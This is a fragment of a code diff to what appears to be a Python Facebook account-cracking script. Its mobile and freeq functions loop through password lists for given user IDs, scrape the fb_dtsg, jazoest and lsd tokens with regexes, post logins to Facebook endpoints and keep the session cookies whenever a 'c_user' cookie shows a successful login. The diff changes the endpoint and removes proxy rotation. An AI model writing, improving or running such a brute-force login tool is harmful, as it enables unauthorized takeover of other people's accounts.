+                '__ccg': re.search(r'"connectionClass"\s*:\s*"([^"]+)"', rt).group(1),
+                '__rev': re.search(r'(?:consistency[^}]*rev:|\"rev\"\s*:\s*|\brev:)(\d+)', rt).group(1),
                 '__s': '',
-                '__hsi': hsiku,
+                '__hsi': re.search(r'"hsi"\s*:\s*"([^"]+)"', rt).group(1),
                 '__dyn': '',
-                'fb_dtsg': dtsg,
-                'jazoest': jazoest,
-                'lsd': lsd,
+                'fb_dtsg': re.search(r'(?:\"dtsg\"\s*:\s*\{\s*\"token\"\s*:\s*\"|\"token\"\s*:\s*\")([^"]+)', rt).group(1),
+                'jazoest': re.search(r'(?:name=["\']jazoest["\']\s+value=["\']|<input[^>]+name=["\']jazoest["\'][^>]+value=["\'])([^"\']+)', rt).group(1),
+                'lsd':  re.search(r'(?:name=["\']lsd["\']\s+value=["\']|<input[^>]+name=["\']lsd["\'][^>]+value=["\']|"lsd"\s*:\s*")([^"\']+)', rt).group(1),
                 'params': json.dumps({
                     "params": json.dumps({
                         "server_params": {
@@ -1978,7 +1842,7 @@ def mobile(uid,pwx,tl):
                     })
                 }),
             }
-            pr = Session.post('https://m.beta.facebook.com/async/wbloks/fetch/', headers=headers, data=data, params=params)
+            pr = Session.post('https://p.facebook.com/async/wbloks/fetch/', headers=headers, data=data, params=params)
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
@@ -2013,13 +1877,6 @@ def mobile(uid,pwx,tl):
         print({error})
         pass
 
-def generate_id():
-    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
-    username_id = f"{prefix}:{random.randint(60, 90)}"
-    password_id = f"{prefix}:{random.randint(91, 120)}"
-    return username_id, password_id
-username_id, password_id = generate_id()
-
 def freeq(uid,pwx,tl):
     global oks
     global cps
@@ -2030,8 +1887,6 @@ def freeq(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            nip=random.choice(xvx)
-            proxs= {'http': nip}
             Session = requests.Session()
             free_fb = Session.get('https://m.facebook.com').text
             data = {
